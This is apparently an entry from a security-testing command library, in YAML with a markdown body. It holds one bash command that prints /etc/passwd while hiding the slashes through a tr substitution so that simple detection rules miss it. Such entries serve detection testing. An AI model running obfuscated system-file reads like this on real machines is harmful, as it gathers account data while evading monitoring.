---
id: 95e6abe6-95c5-4f86-9357-fef4519b2d0c
name: Display contents of /etc/passwd file
type: command
executor: bash
data: cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
output: null
created_at: '2023-04-06T03:55:57.212221+00:00'
updated_at: '2023-04-06T03:55:57.223360+00:00'
---

# Display contents of /etc/passwd file

```bash
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
